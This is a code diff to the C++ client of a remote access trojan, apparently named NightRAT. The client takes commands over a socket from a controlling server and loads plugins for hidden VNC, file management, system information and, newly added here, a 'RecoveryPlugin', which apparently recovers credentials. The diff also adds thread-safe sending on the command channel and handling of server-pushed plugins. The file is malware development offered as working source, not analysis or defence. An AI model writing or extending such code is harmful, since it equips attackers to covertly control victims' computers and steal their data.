@@ -10,6 +10,7 @@
 #include <thread>
 #include <chrono>
 #include <cstdint>
+#include <mutex>
 #include "../include/json.hpp"
 #include "../include/PluginManager.hpp"
 
@@ -90,6 +91,7 @@ class NightClient {
 private:
     SOCKET sock;
     PluginManager pluginMgr;
+    HANDLE hSocketMutex;
     bool connected = false;
     string pendingPluginId;
     string pendingPluginCommand;
@@ -103,6 +105,7 @@ private:
     const string OPEN_URL_PLUGIN_ID = "OpenURLPlugin";
     const string FILE_MANAGER_PLUGIN_ID = "FileManagerPlugin";
     const string HIDDEN_VNC_PLUGIN_ID = "HiddenVNCPlugin";
+    const string RECOVERY_PLUGIN_ID = "RecoveryPlugin";
 
     // Registry helper for initial info
     string getRegValue(HKEY hKeyRoot, const char* subKey, const char* valueName) {
@@ -115,8 +118,10 @@ private:
 
     void send_data(json data) {
         if (!connected) return;
+        if (hSocketMutex) WaitForSingleObject(hSocketMutex, INFINITE);
         string msg = data.dump() + "\r\n";
         send(sock, msg.c_str(), (int)msg.length(), 0);
+        if (hSocketMutex) ReleaseMutex(hSocketMutex);
     }
 
     void request_plugin(const string& pluginId, const json& commandToRunAfterLoad = json()) {
@@ -189,7 +194,11 @@ private:
             auto data = json::parse(json_str);
             string action = data.value("action", "");
 
-            if (action == "getinfo") {
+            if (action == "incoming_plugin") {
+                pendingPluginId = data.value("id", "");
+                cout << "[*] Incoming plugin notification: " << pendingPluginId << endl;
+            }
+            else if (action == "getinfo") {
                 if (pluginMgr.isPluginLoaded(INFORMATION_PLUGIN_ID)) {
                     pluginMgr.executePlugin(INFORMATION_PLUGIN_ID, "RunPlugin", sock);
                 } else {
@@ -329,6 +338,11 @@ private:
                                     } else {
                                         pluginMgr.executePlugin(HIDDEN_VNC_PLUGIN_ID, "RunPlugin", sock);
                                     }
+                                } else if (pluginId == RECOVERY_PLUGIN_ID) {
+                                    // Execute recovery in a detached thread to prevent blocking heartbeats
+                                    std::thread([this, s = this->sock]() {
+                                        this->pluginMgr.executePlugin(RECOVERY_PLUGIN_ID, "RunPlugin", s);
+                                    }).detach();
                                 }
                             }
 
@@ -379,6 +393,14 @@ private:
     }
 
 public:
+    NightClient() {
+        hSocketMutex = CreateMutexW(NULL, FALSE, L"Global\\NightRAT_Socket_Mutex");
+    }
+
+    ~NightClient() {
+        if (hSocketMutex) CloseHandle(hSocketMutex);
+    }
+
     void start(const char* ip, int port) {
         while (true) {
             WSADATA wsa;
